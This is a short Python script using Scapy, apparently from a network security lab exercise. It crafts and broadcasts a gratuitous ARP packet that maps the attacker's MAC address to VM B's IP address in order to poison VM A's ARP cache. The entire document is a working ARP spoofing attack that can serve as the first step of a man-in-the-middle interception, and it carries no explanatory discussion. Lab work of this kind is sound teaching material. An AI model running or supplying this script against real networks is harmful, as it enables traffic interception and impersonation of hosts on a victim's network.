#!/usr/bin/python3
from scapy.all import *
E = Ether(dst = 'ff:ff:ff:ff:ff:ff', src = '08:00:27:17:de:fa')
# Mapping Attacker's MAC address with VM B's IP and sending to VM A's ARP cache
A = ARP(
    hwsrc = '08:00:27:17:de:fa', psrc = '10.0.2.14',
    hwdst='ff:ff:ff:ff:ff:ff', pdst='10.0.2.14'
)
pkt = E/A
pkt.show()
sendp(pkt)